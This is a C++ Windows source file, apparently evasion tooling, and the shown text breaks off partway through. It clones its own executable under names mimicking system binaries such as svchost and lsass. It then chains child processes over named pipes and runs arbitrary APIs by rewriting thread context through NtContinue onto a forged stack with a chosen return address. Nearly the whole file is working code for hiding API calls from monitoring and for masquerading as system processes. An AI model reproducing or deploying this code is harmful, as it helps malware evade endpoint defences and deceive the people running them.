#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <cstdio>
#include <random>   
#include <sstream>  
#include <memory>   
#include <tlhelp32.h>

#ifdef _DEBUG
#define DEBUG_PRINTF(...) printf(__VA_ARGS__)
#define DEBUG_COUT(x) std::cout << x
#else
#define DEBUG_PRINTF(...) do {} while (0)
#define DEBUG_COUT(x) do {} while (0)
#endif

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
typedef NTSTATUS(NTAPI* NtContinue_t)(PCONTEXT ContextRecord, BOOLEAN TestAlert);

const std::vector<std::string> MS_BINARY_NAMES = {
    "svchost", "wininit", "csrss", "lsass", "winlogon", "spoolsv", "dwm",
    "explorer", "taskmgr", "msiexec", "conhost", "rundll32", "services",
    "smss", "ntoskrnl", "regsvr32", "mmc", "dllhost", "wuauclt", "iexplore"
};
std::string GenerateRandomBinaryName() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distrib(0, MS_BINARY_NAMES.size() - 1);
    std::stringstream ss;
    ss << MS_BINARY_NAMES[distrib(gen)] << "_" << GetTickCount64() << ".exe";
    return ss.str();
}
FARPROC ResolveFunction(const std::string& funcNameWithModule) {
    size_t pos = funcNameWithModule.find('!');
    if (pos == std::string::npos) {
        std::cerr << "ResolveFunction: Invalid format. Expected 'Module!Function', got '" << funcNameWithModule << "'" << std::endl;
        return nullptr;
    }
    std::string moduleName = funcNameWithModule.substr(0, pos);
    std::string functionName = funcNameWithModule.substr(pos + 1);
    HMODULE hModule = GetModuleHandleA(moduleName.c_str());
    if (!hModule) {
        hModule = LoadLibraryA(moduleName.c_str());
        if (!hModule) {
            std::cerr << "ResolveFunction: Failed to load module: " << moduleName << " Error: " << GetLastError() << std::endl;
            return nullptr;
        }
    }
    FARPROC procAddr = GetProcAddress(hModule, functionName.c_str());
    if (!procAddr) {
        std::cerr << "ResolveFunction: Failed to resolve function: " << functionName << " in " << moduleName << " Error: " << GetLastError() << std::endl;
    }
    return procAddr;
}
HANDLE CreateIPCPipe(const std::string& pipeName, bool isServer) {
    std::string fullPipeName = "\\\\.\\pipe\\" + pipeName;
    if (isServer) {
        return CreateNamedPipeA(fullPipeName.c_str(), PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES, 4096, 4096, 0, NULL);
    }
    else {
        HANDLE hPipe = INVALID_HANDLE_VALUE;
        for (int i = 0; i < 10; ++i) { // Retry connecting for a short period
            hPipe = CreateFileA(fullPipeName.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL,
                OPEN_EXISTING, 0, NULL);
            if (hPipe != INVALID_HANDLE_VALUE) break;
            if (GetLastError() != ERROR_PIPE_BUSY) break;
            Sleep(100); // Wait and retry if busy
        }
        return hPipe;
    }
}
std::string CreateCloneExecutable() {
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    std::string newName = GenerateRandomBinaryName();
    std::string newPath = std::string(currentPath);
    size_t lastSlash = newPath.find_last_of('\\');
    if (lastSlash != std::string::npos) {
        newPath = newPath.substr(0, lastSlash + 1) + newName;
    }
    else {
        newPath = newName; // Should not happen if GetModuleFileNameA gives full path
    }
    if (!CopyFileA(currentPath, newPath.c_str(), FALSE)) {
        std::cerr << "CreateCloneExecutable: Failed to copy file to " << newPath << " Error: " << GetLastError() << std::endl;
        return ""; // Return empty on failure
    }

    // Set temporary attribute in case cleaup fails
    if (!SetFileAttributesA(newPath.c_str(), FILE_ATTRIBUTE_TEMPORARY)) {
        DEBUG_PRINTF("CreateCloneExecutable: Warning - Failed to set TEMPORARY attribute on %s. Error: %lu\n",
            newPath.c_str(), GetLastError());
    }
    return newPath;
}

DWORD FindProcessPid(const wchar_t * ProcName) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "FindProcessPid: CreateToolhelp32Snapshot failed. Error: " << GetLastError() << std::endl;
        return 0;
    }

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, ProcName) == 0) {
                CloseHandle(hSnapshot);
                std::cout << "FindProcessPid: Found " << ProcName << " with PID : " << pe32.th32ProcessID << std::endl;
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    else {
        std::cerr << "FindNotepadPid: Process32First failed. Error: " << GetLastError() << std::endl;
    }

    CloseHandle(hSnapshot);
    std::cerr << "FindNotepadPid: notepad.exe not found." << std::endl;
    return 0;
}

extern "C" void CaptureRAX_And_CallHelper();  // Assembly stub

// Data to be sent back over the pipe from the C++ helper
struct ApiCallResultResponse {
    BOOL    wasApiCallConsideredSuccess;
    DWORD64 apiReturnValue;
    DWORD   lastErrorValue;
};

HANDLE g_hPipeForChildResponse = INVALID_HANDLE_VALUE;
void* g_pSharedSection = nullptr; 

// C++ helper function, to be called from assembly stub CaptureRAX_And_CallHelper.
extern "C" __declspec(noinline) void NTAPI ProcessResultAndExit(DWORD64 raxFromApi) {
    DEBUG_PRINTF("ProcessResultAndExit: Captured RAX from target API = 0x%llX\n", raxFromApi);

    ApiCallResultResponse response;
    response.wasApiCallConsideredSuccess = TRUE; // Rule 1: Reaching here means delegation was successful.
    response.apiReturnValue = raxFromApi;      // Rule 2: Store raw RAX.
    response.lastErrorValue = GetLastError();  // Store GetLastError() at this point.

    // Log the LastError captured here for debugging, as it might be different from one immediately after API.
    DEBUG_PRINTF("ProcessResultAndExit: LastError at time of helper execution: %lu\n", response.lastErrorValue);

    
	std::string pipeName = "RecursiveDelegationPipe_" + std::to_string(GetCurrentProcessId()) + "_0"; // Level 0 pipe name
	
    if (g_hPipeForChildResponse == INVALID_HANDLE_VALUE) {
        DEBUG_COUT("ProcessResultAndExit: Failed to connect to pipe. g_hPipeForChildResponse is not initialized.");
        TerminateProcess(GetCurrentProcess(), 3); // Indicate critical error
    }

    DEBUG_COUT("Child (ProcessResultAndExit): Sending ApiCallResultResponse to parent." << std::endl);
    DWORD bytesWritten;
    if (!WriteFile(g_hPipeForChildResponse, &response, sizeof(ApiCallResultResponse), &bytesWritten, NULL) || bytesWritten != sizeof(ApiCallResultResponse)) {
        std::cerr << "Child (ProcessResultAndExit): Failed to write ApiCallResultResponse to pipe. Error: " << GetLastError() << std::endl;
        // Continue to terminate, parent will likely detect broken pipe or timeout.
    }
    else {
        DEBUG_COUT("Child (ProcessResultAndExit): Sent ApiCallResultResponse to parent." << std::endl);
    }

    DEBUG_COUT("CppHelper_ProcessResultAndExit: Terminating process. Exit code based on wasApiCallConsideredSuccess (always TRUE here)." << std::endl);
    TerminateProcess(GetCurrentProcess(), response.wasApiCallConsideredSuccess ? 0 : 1); // Will be 0 based on Rule 1
    ExitProcess(response.wasApiCallConsideredSuccess ? 0 : 2); // Fallback
}

void* PrepareStackForApiCall(
    const std::vector<DWORD64>& stackArgs_in_order,
    FARPROC pRetAddressForApi,
    void** outStackAllocationBase
) {
    if (!pRetAddressForApi || !outStackAllocationBase) {
        std::cerr << "PrepareStackForApiCall: ERROR - Null pRetAddressForApi or outStackAllocationBase." << std::endl;
        return nullptr;
    }
    const size_t shadowSpaceSize = 32;
    const size_t retAddrSlotSize = 8;
    const size_t firstStackArgOffset = 0x28;
    size_t numStackArgs = stackArgs_in_order.size();
    size_t totalStackArgsSizeBytes = numStackArgs * sizeof(DWORD64);
    SIZE_T allocationSize = (2 << 20);  // not just for our functions but enough for everything else that runs in the thread such as the thread cleanup routine
    SIZE_T minRequiredForOurData = retAddrSlotSize + shadowSpaceSize + totalStackArgsSizeBytes + 16;
    if (allocationSize < minRequiredForOurData) {
        allocationSize = minRequiredForOurData + 4096;
        DEBUG_COUT("  INFO: Increased allocationSize to " << allocationSize << " due to argument data size." << std::endl);
    }
    void* stackBase = VirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!stackBase) {
        std::cerr << "PrepareStackForApiCall: ERROR - VirtualAlloc failed. Error: " << GetLastError() << std::endl;
        return nullptr;
    }
    *outStackAllocationBase = stackBase;
    DEBUG_COUT("  DEBUG: PrepareStackForApiCall - stackBase = " << stackBase
        << ", allocationSize = " << allocationSize << std::endl);
    char* pStackHighWatermark = (char*)stackBase + allocationSize;
    char* pTentative_Addr_5th_Arg_Slot = pStackHighWatermark - totalStackArgsSizeBytes;
    char* pProspectiveRsp = pTentative_Addr_5th_Arg_Slot - shadowSpaceSize - retAddrSlotSize;
    DEBUG_COUT("  DEBUG: pStackHighWatermark (initial top for calc) = " << (void*)pStackHighWatermark << std::endl);
    DEBUG_COUT("  DEBUG: pTentative_Addr_5th_Arg_Slot (if args pushed from top) = " << (void*)pTentative_Addr_5th_Arg_Slot << std::endl);
    DEBUG_COUT("  DEBUG: pProspectiveRsp (unaligned RSP target) = " << (void*)pProspectiveRsp << std::endl);
    DWORD64 finalRspVal = ((DWORD64)pProspectiveRsp - 8ULL) & ~15ULL;
    finalRspVal += 8ULL;
    DEBUG_COUT("  DEBUG: finalRspVal (calculated and aligned RSP) = " << (void*)finalRspVal << std::endl);
    if (finalRspVal < (DWORD64)stackBase || (finalRspVal + retAddrSlotSize) >((DWORD64)stackBase + allocationSize)) {
        std::cerr << "PrepareStackForApiCall: ERROR - finalRspVal is outside allocated stack region after alignment." << std::endl;
        std::cerr << "  stackBase: " << stackBase << ", stackEnd: " << (void*)((char*)stackBase + allocationSize - 1) << std::endl;
        std::cerr << "  finalRspVal: " << (void*)finalRspVal << std::endl;
        VirtualFree(stackBase, 0, MEM_RELEASE); *outStackAllocationBase = nullptr; return nullptr;
    }
    *(DWORD64*)finalRspVal = (DWORD64)pRetAddressForApi;
    DEBUG_PRINTF("  DEBUG: PLACED Return Address (value 0x%llX) to actual RSP %p\n",
        (unsigned long long)(DWORD64)pRetAddressForApi, (void*)finalRspVal);
    char* pArgWriter = (char*)finalRspVal + firstStackArgOffset;
    DEBUG_COUT("  DEBUG: Placing stack arguments relative to finalRspVal:" << std::endl);
    for (size_t i = 0; i < numStackArgs; ++i) {
        if ((pArgWriter + sizeof(DWORD64)) > ((char*)stackBase + allocationSize)) {
            std::cerr << "PrepareStackForApiCall: ERROR - About to write stack argument #" << (i + 5)
                << " out of allocated stack bounds." << std::endl;
            std::cerr << "  pArgWriter: " << (void*)pArgWriter << ", stackEnd: "
                << (void*)((char*)stackBase + allocationSize - 1) << std::endl;
            VirtualFree(stackBase, 0, MEM_RELEASE); *outStackAllocationBase = nullptr; return nullptr;
        }
        *(DWORD64*)pArgWriter = stackArgs_in_order[i];
        DEBUG_PRINTF("  DEBUG: PLACED arg #%zu (value 0x%llX) to address %p (RSP+0x%X)\n",
            i + 5, (unsigned long long)stackArgs_in_order[i], (void*)pArgWriter,
            (unsigned int)(firstStackArgOffset + i * sizeof(DWORD64)));
        pArgWriter += sizeof(DWORD64);
    }
    std::cout << "Prepared stack. Final New RSP will be: " << (void*)finalRspVal
        << " (RSP % 16 = " << (finalRspVal % 16) << ")" << std::endl;
    std::cout << "  Return address for API set to: " << (void*)pRetAddressForApi << std::endl;
    if (!stackArgs_in_order.empty()) {
        DEBUG_PRINTF("  VERIFICATION: 5th arg (value 0x%llX) is at %p (RSP+0x%X)\n",
            (unsigned long long)stackArgs_in_order[0], (void*)(finalRspVal + firstStackArgOffset),
            (unsigned int)firstStackArgOffset);
        if (numStackArgs > 1) {
            DEBUG_PRINTF("  VERIFICATION: 6th arg (value 0x%llX) is at %p (RSP+0x%X)\n",
                (unsigned long long)stackArgs_in_order[1], (void*)(finalRspVal + firstStackArgOffset + sizeof(DWORD64)),
                (unsigned int)(firstStackArgOffset + sizeof(DWORD64)));
        }
    }
    else {
        std::cout << "  No stack arguments were provided for the API call." << std::endl;
    }
    return (void*)finalRspVal;
}


struct ApiCallParams {
    char funcNameWithModule[256]; // e.g., "Kernel32!VirtualAllocEx"
    DWORD64 rcx_val;
    DWORD64 rdx_val;
    DWORD64 r8_val;
    DWORD64 r9_val;

    // Allows us to place data such as strings on the stack on reference them as offsets
	// The function exuector will handle stack base and spillspace.
    BOOL rcx_is_ptr_offset_from_stack;
    BOOL rdx_is_ptr_offset_from_stack;
    BOOL r8_is_ptr_offset_from_stack;
    BOOL r9_is_ptr_offset_from_stack;

    // Stack arguments will be sent as a vector separately
};

// This is called at level 0 to actually perform the API call.
bool ExecuteApiCallAtLevelZero(
    const ApiCallParams* pCallParams,
    const std::vector<DWORD64>* pStackArgs,
    NtContinue_t pNtContinueFunc, // NtContinue, our API Caller.
    FARPROC pExitFunc,        // If both pExitFunct and ExitFuncName are null, we will use CaptureRAX_And_CallHelper (asm stub), otherwise the order or priority is:
    std::string ExitFuncName  // pExitFunct -> ExitFuncName -> "CaptureRAX_And_CallHelper"
) {
    DEBUG_COUT("ExecuteApiCallAtLevelZero: Preparing to execute API: " << pCallParams->funcNameWithModule << std::endl);

    FARPROC targetApi = ResolveFunction(pCallParams->funcNameWithModule);
    if (!targetApi) {
        std::cerr << "ExecuteApiCallAtLevelZero: Failed to resolve target API." << std::endl;
        return false;
    }

    if (!pExitFunc) {
        std::cerr << "RecursiveDelegate: pExitFunc not provided. Attempting to resolve exit function: " << ExitFuncName << std::endl;
        if (ExitFuncName.empty() || ExitFuncName == "default" || ExitFuncName == "CaptureRAX_And_CallHelper") {
            pExitFunc = (FARPROC)CaptureRAX_And_CallHelper; // Use our assembly stub
            DEBUG_COUT("RecursiveDelegate: Using default exit function: CaptureRAX_And_CallHelper" << std::endl);
        }
        else {
            pExitFunc = ResolveFunction(ExitFuncName);
        }
    }

    if (!pExitFunc) {
        std::cerr << "RecursiveDelegate: Failed to resolve exit function: " << ExitFuncName << std::endl;
        return false;
    }

	DEBUG_COUT("ExecuteApiCallAtLevelZero: pExitFunc: " << pExitFunc << std::endl);

    void* stackAllocationBase = nullptr;
    void* pNewStackTopForTargetApi = PrepareStackForApiCall(
        *pStackArgs,
        pExitFunc, // Target API will RET to this function
        &stackAllocationBase
    );

    if (!pNewStackTopForTargetApi) {
        std::cerr << "ExecuteApiCallAtLevelZero: ERROR - Failed to prepare stack for target API." << std::endl;
        if (stackAllocationBase) VirtualFree(stackAllocationBase, 0, MEM_RELEASE);
        return false;
    }

    CONTEXT targetContext;
    ZeroMemory(&targetContext, sizeof(CONTEXT));
    // For NtContinue, explicitly set segments if not relying on current thread's.
    // A common practice is to get current context, modify, then pass to NtContinue.
    // However, for a fresh "warp", minimal context might work, but can be risky.
    // To be safer, let's capture the current thread's full context and modify that.
    // This is especially important for segment registers (CS, DS, ES, SS, FS, GS).
    // Since this function *is* the thread that will be warped, this is appropriate.

    // Get current context as a base
    RtlCaptureContext(&targetContext); // Or GetThreadContext(GetCurrentThread(), &targetContext)
    // RtlCaptureContext is often preferred for current thread.

    // Now, overwrite the parts we need for the target API call
    // The ContextFlags field for NtContinue should reflect what we are providing
    // and what the system might need to correctly switch.
    //targetContext.ContextFlags = CONTEXT_CONTROL |
    //    CONTEXT_INTEGER |
    //    CONTEXT_SEGMENTS |
    //    CONTEXT_FLOATING_POINT; // Add FPU/XMM state

    //// Check if XState is enabled and used, then include it.
    //// This requires careful handling of the XState save area.
    //// RtlCaptureContext *should* have populated it correctly.
    //ULONG64 xstateFeatures = GetEnabledXStateFeatures();
    //if (xstateFeatures != 0) { // If any XState features are enabled. AVX and SSE stuff is nasty and confusing.
    //    targetContext.ContextFlags |= CONTEXT_XSTATE;
    //    // Ensure the XSTATE_SAVE_AREA is properly aligned and large enough.
    //    // RtlCaptureContext populates the XState features in the CONTEXT structure.
    //    // The CONTEXT structure itself contains space for this.
    //}

	// Prepare the CONTEXT structure
    targetContext.Rip = (DWORD64)targetApi;
    targetContext.Rcx = pCallParams->rcx_val;
    targetContext.Rdx = pCallParams->rdx_val;
    targetContext.R8 = pCallParams->r8_val;
    targetContext.R9 = pCallParams->r9_val;
    targetContext.Rsp = (DWORD64)pNewStackTopForTargetApi;
    targetContext.Rbp = targetContext.Rsp; // Set RBP to new RSP

    // Fix pointers that are references to stack
    DWORD64 shadowSpace = 0x28;
    if (pCallParams->rcx_is_ptr_offset_from_stack) { targetContext.Rcx += targetContext.Rsp + shadowSpace;  }
    if (pCallParams->rdx_is_ptr_offset_from_stack) { targetContext.Rdx += targetContext.Rsp + shadowSpace; }
    if (pCallParams->r8_is_ptr_offset_from_stack) { targetContext.R8 += targetContext.Rsp + shadowSpace; }
    if (pCallParams->r9_is_ptr_offset_from_stack) { targetContext.R9 += targetContext.Rsp + shadowSpace; }

    // EFlags: The original code set it to 0x202.
    // RtlCaptureContext will have the current EFlags. Modifying IF (Interrupt Flag)
    // is generally not needed unless specifically intended. For now, let's trust
    // what RtlCaptureContext provides, or set a known-good default if issues arise.
    // targetContext.EFlags = 0x202; // Overwrite if necessary, but usually not.
    DEBUG_PRINTF("ExecuteApiCallAtLevelZero: Prepared CONTEXT for NtContinue:\n");
    DEBUG_PRINTF("  RIP: 0x%llX\n", targetContext.Rip);
    DEBUG_PRINTF("  RCX: 0x%llX, RDX: 0x%llX, R8: 0x%llX, R9: 0x%llX\n",
        targetContext.Rcx, targetContext.Rdx, targetContext.R8, targetContext.R9);
    DEBUG_PRINTF("  RSP: 0x%llX, RBP: 0x%llX\n", targetContext.Rsp, targetContext.Rbp);
    DEBUG_PRINTF("  EFlags: 0x%X\n", targetContext.EFlags); // Can be noisy, current EFlags is fine.

    DEBUG_COUT("ExecuteApiCallAtLevelZero: Calling NtContinue..." << std::endl);
    NTSTATUS status = pNtContinueFunc(&targetContext, FALSE);

    std::cerr << "ExecuteApiCallAtLevelZero: ERROR - NtContinue returned with status 0x"
        << std::hex << status << std::dec << ". This is unexpected." << std::endl;
    if (stackAllocationBase) {
        VirtualFree(stackAllocationBase, 0, MEM_RELEASE);
    }
    // This return is only hit if NtContinue fails, which means the thread did not warp.
    return NT_SUCCESS(status);
}

bool RecursiveDelegate(
    int level,
    const ApiCallParams* pCallParams,
    const std::vector<DWORD64>* pStackArgs,
    NtContinue_t pNtContinueFunc,
    FARPROC pExitFunc,
    std::string ExitFunc,
    ApiCallResultResponse* outApiResponse
) {
    std::cout << "Process " << GetCurrentProcessId() << " at recursion level: " << level
        << ", target: " << pCallParams->funcNameWithModule << std::endl;

    // Debug print args
	DEBUG_COUT("RecursiveDelegate: Called with level: " << level << std::endl);
	DEBUG_COUT("RecursiveDelegate: Target API: " << pCallParams->funcNameWithModule << std::endl);
	DEBUG_COUT("RecursiveDelegate: Exit Function: " << ExitFunc << std::endl);
	DEBUG_COUT("RecursiveDelegate: RCX: " << std::hex << pCallParams->rcx_val << std::dec << std::endl);
	DEBUG_COUT("RecursiveDelegate: RDX: " << std::hex << pCallParams->rdx_val << std::dec << std::endl);
	DEBUG_COUT("RecursiveDelegate: R8: " << std::hex << pCallParams->r8_val << std::dec << std::endl);
	DEBUG_COUT("RecursiveDelegate: R9: " << std::hex << pCallParams->r9_val << std::dec << std::endl);
	DEBUG_COUT("RecursiveDelegate: Stack arguments count: " << pStackArgs->size() << std::endl);
	for (size_t i = 0; i < pStackArgs->size(); ++i) {
		DEBUG_COUT("RecursiveDelegate: Stack arg " << i + 5 << ": " << std::hex << (*pStackArgs)[i] << std::dec << std::endl);
	}

    if (level <= 0) {
        std::cout << "Executing function at level 0: " << pCallParams->funcNameWithModule << std::endl;
		DEBUG_COUT("Calling ExecuteApiCallAtLevelZero: pExitFunc: " << pExitFunc << " ,ExitFunc: " << ExitFunc <<  std::endl);

        return ExecuteApiCallAtLevelZero(pCallParams, pStackArgs, pNtContinueFunc, pExitFunc, ExitFunc);
    }

    std::string clonePath = CreateCloneExecutable();
    if (clonePath.empty()) {
        std::cerr << "RecursiveDelegate: Failed to create clone executable." << std::endl;
        return false;
    }

    std::stringstream pipeNameSs;
    pipeNameSs << "RecursiveDelegationPipe_" << GetCurrentProcessId() << "_" << level;
    std::string pipeName = pipeNameSs.str();

    HANDLE hPipe = CreateIPCPipe(pipeName, true);
    if (hPipe == INVALID_HANDLE_VALUE) {
        std::cerr << "RecursiveDelegate: Failed to create pipe server '" << pipeName << "'. Error: " << GetLastError() << std::endl;
        DeleteFileA(clonePath.c_str()); // Clean up clone
        return false;
    }
    DEBUG_COUT("RecursiveDelegate: Pipe server created: " << pipeName << std::endl);

    std::stringstream cmdLine;
    // Quote clonePath in case it has spaces
    cmdLine << "\"" << clonePath << "\" " << (level - 1)
        << " \"" << pCallParams->funcNameWithModule << "\" " // Pass original func name string
        << pipeName << " "                                   // Pipe name for child to connect to
        << ExitFunc;                                         // Pass exit function name

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi;

    DEBUG_COUT("RecursiveDelegate: Creating child process: " << cmdLine.str() << std::endl);
    if (!CreateProcessA(NULL, const_cast<LPSTR>(cmdLine.str().c_str()), NULL, NULL,
        TRUE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "RecursiveDelegate: Failed to create child process. Error: " << GetLastError() << std::endl;
        CloseHandle(hPipe);
        DeleteFileA(clonePath.c_str());
        return false;
    }
    DEBUG_COUT("RecursiveDelegate: Child process created. PID: " << pi.dwProcessId << std::endl);

    DEBUG_COUT("RecursiveDelegate: Waiting for pipe client to connect..." << std::endl);
    if (!ConnectNamedPipe(hPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
        std::cerr << "RecursiveDelegate: Failed to connect to client on pipe. Error: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1); // Terminate child if pipe connection fails
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hPipe);
        DeleteFileA(clonePath.c_str());
        return false;
    }
    DEBUG_COUT("RecursiveDelegate: Pipe client connected." << std::endl);

    DWORD bytesWritten;
    // Send ApiCallParams (fixed size structure)
    if (!WriteFile(hPipe, pCallParams, sizeof(ApiCallParams), &bytesWritten, NULL) || bytesWritten != sizeof(ApiCallParams)) {
        std::cerr << "RecursiveDelegate: Failed to write ApiCallParams to pipe. Error: " << GetLastError() << std::endl;
        return false;
    }
    DEBUG_COUT("RecursiveDelegate: Sent ApiCallParams." << std::endl);


    // Send number of stack arguments
    SIZE_T numStackArgs = pStackArgs->size();
    if (!WriteFile(hPipe, &numStackArgs, sizeof(SIZE_T), &bytesWritten, NULL) || bytesWritten != sizeof(SIZE_T)) {
        std::cerr << "RecursiveDelegate: Failed to write numStackArgs to pipe. Error: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hPipe); DeleteFileA(clonePath.c_str());
        return false;
    }
    DEBUG_COUT("RecursiveDelegate: Sent numStackArgs: " << numStackArgs << std::endl);


    // Send stack argument data (if any)
    if (numStackArgs > 0) {
        SIZE_T stackArgsDataSize = numStackArgs * sizeof(DWORD64);
        if (!WriteFile(hPipe, pStackArgs->data(), stackArgsDataSize, &bytesWritten, NULL) || bytesWritten != stackArgsDataSize) {
            std::cerr << "RecursiveDelegate: Failed to write stackArgs data to pipe. Error: " << GetLastError() << std::endl;
            TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hPipe); DeleteFileA(clonePath.c_str());
            return false;
        }
        DEBUG_COUT("RecursiveDelegate: Sent stackArgs data." << std::endl);
    }


    DEBUG_COUT("RecursiveDelegate: Waiting for result from child..." << std::endl);
    DEBUG_COUT("RecursiveDelegate (Parent of level " << level - 1 << "): Waiting for ApiCallResultResponse from child..." << std::endl);

    // Initialize outApiResponse to a default failure state in case ReadFile fails badly
    outApiResponse->wasApiCallConsideredSuccess = FALSE;
    outApiResponse->apiReturnValue = 0;
    outApiResponse->lastErrorValue = (DWORD)-1; // Indicate uninitialized or read failure

    DWORD bytesRead;
    if (!ReadFile(hPipe, outApiResponse, sizeof(ApiCallResultResponse), &bytesRead, NULL) || bytesRead != sizeof(ApiCallResultResponse)) {
        DWORD readError = GetLastError();
        std::cerr << "RecursiveDelegate (Parent of level " << level - 1 << "): Failed to read ApiCallResultResponse from child. Error: " << readError << std::endl;
        // Keep the default failure state set above
        outApiResponse->lastErrorValue = readError; // Store the read error
        TerminateProcess(pi.hProcess, 1); // Kill child if pipe communication breaks
    }
    else {
        DEBUG_COUT("RecursiveDelegate (Parent of level " << level - 1 << "): Received ApiCallResultResponse from child:" << std::endl);
        DEBUG_PRINTF("  Response Struct: wasApiCallConsideredSuccess: %s\n",
            outApiResponse->wasApiCallConsideredSuccess ? "TRUE" : "FALSE");
        DEBUG_PRINTF("  Response Struct: apiReturnValue (RAX from child): 0x%llX\n", outApiResponse->apiReturnValue);
        DEBUG_PRINTF("  Response Struct: lastErrorValue (GetLastError in child's helper): %lu\n", outApiResponse->lastErrorValue);
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD childExitCode;
    if (GetExitCodeProcess(pi.hProcess, &childExitCode)) {
        DEBUG_COUT("RecursiveDelegate: Child process (PID: " << pi.dwProcessId << ") exited with code: " << childExitCode << std::endl);
        // Compare childExitCode (0 or 1 from TerminateProcess in ProcessResultAndExit)
        // with outApiResponse->wasApiCallConsideredSuccess. They should match.
    }

    CloseHandle(hPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    if (!DeleteFileA(clonePath.c_str())) {
        if (GetLastError() != ERROR_FILE_NOT_FOUND) {
            std::cerr << "RecursiveDelegate: Warning - Failed to delete clone " << clonePath << ". Error: " << GetLastError() << std::endl;
        }
    }

    // The function's bool return now directly reflects what the child sent in wasApiCallConsideredSuccess.
    // As per Rule 1, this will be TRUE if the child successfully sent the response.
    return outApiResponse->wasApiCallConsideredSuccess == TRUE;
}

bool ProcessChildMode(
    int argc, char* argv[],
    NtContinue_t pNtContinueFunc
) {
	if (argc < 4) { // ExecutableName, Level, FuncName, PipeName, ExitFuncName (optional)
        std::cerr << "Child: Insufficient arguments." << std::endl;
        return false;
    }

    int level = atoi(argv[1]);
	// argv[2] is funcNameWithModule, argv[3] is pipeName, argv[4] is ExitFunc (optional)
    // We don't need funcNameWithModule directly here, as it's inside ApiCallParams

    std::string pipeName = argv[3];
    DEBUG_COUT("Child (PID " << GetCurrentProcessId() << "): Connecting to pipe: " << pipeName << std::endl);


    HANDLE hPipe = CreateIPCPipe(pipeName, false);
    if (hPipe == INVALID_HANDLE_VALUE) {
        std::cerr << "Child: Failed to connect to pipe '" << pipeName << "'. Error: " << GetLastError() << std::endl;
        return false;
    }
    g_hPipeForChildResponse = hPipe;
    DEBUG_COUT("Child: Connected to pipe." << std::endl);

    ApiCallParams receivedApiParams;
    std::vector<DWORD64> receivedStackArgs;
    DWORD bytesRead;

    if (!ReadFile(hPipe, &receivedApiParams, sizeof(ApiCallParams), &bytesRead, NULL) || bytesRead != sizeof(ApiCallParams)) {
        std::cerr << "Child: Failed to read ApiCallParams. Error: " << GetLastError() << std::endl;
        CloseHandle(hPipe); return false;
    }
    DEBUG_COUT("Child: Received ApiCallParams for: " << receivedApiParams.funcNameWithModule << std::endl);

    SIZE_T numStackArgs;
    if (!ReadFile(hPipe, &numStackArgs, sizeof(SIZE_T), &bytesRead, NULL) || bytesRead != sizeof(SIZE_T)) {
        std::cerr << "Child: Failed to read numStackArgs. Error: " << GetLastError() << std::endl;
        CloseHandle(hPipe); return false;
    }
    DEBUG_COUT("Child: Received numStackArgs: " << numStackArgs << std::endl);


    if (numStackArgs > 0) {
        receivedStackArgs.resize(numStackArgs);
        SIZE_T stackArgsDataSize = numStackArgs * sizeof(DWORD64);
        if (!ReadFile(hPipe, receivedStackArgs.data(), stackArgsDataSize, &bytesRead, NULL) || bytesRead != stackArgsDataSize) {
            std::cerr << "Child: Failed to read stackArgs data. Error: " << GetLastError() << std::endl;
            CloseHandle(hPipe); return false;
        }
        DEBUG_COUT("Child: Received stackArgs data." << std::endl);
    }
    std::string ExitFunc = "default";
    FARPROC pExitFunc = NULL;
	if (argc >= 5) {
        std::string ExitFuncProvided = argv[4];   // Optional exit function name is provided to be resolved later
        // Check if its a function address or a function name
		if (ExitFuncProvided.empty() || 
            ExitFuncProvided == "default" ||
            ExitFuncProvided.find('!') != std::string::npos) {
            DEBUG_COUT("Child: Using exit function name: " << ExitFuncProvided << std::endl);
			ExitFunc = ExitFuncProvided; // Use the provided name
		}
		else {
			// If it's a direct address, convert it
			pExitFunc = (FARPROC)strtoull(ExitFuncProvided.c_str(), NULL, 16);
			DEBUG_COUT("Child: Using exit function address: " << pExitFunc << std::endl);
		}
	}

    ApiCallResultResponse responseToSendToMyParent;
    // Initialize to a default failure state in case things go wrong before it's properly filled.
    responseToSendToMyParent.wasApiCallConsideredSuccess = FALSE;
    responseToSendToMyParent.apiReturnValue = 0;
    responseToSendToMyParent.lastErrorValue = (DWORD)-1; // Indicate problem

    if (level > 0) {
        // This child (level N) calls RecursiveDelegate for level N-1.
        // The ApiCallResultResponse from that N-1 child will be put into 'responseToSendToMyParent'.
        DEBUG_COUT("Child (level " << level << "): Delegating to next level. Will receive ApiCallResultResponse." << std::endl);
        RecursiveDelegate(level, &receivedApiParams, &receivedStackArgs, pNtContinueFunc, pExitFunc, ExitFunc, &responseToSendToMyParent);
        // 'responseToSendToMyParent' is now filled by the call above.
    }
    else { // level == 0, this process will execute the API.
        DEBUG_COUT("Child (level 0): Preparing to execute API directly." << std::endl);
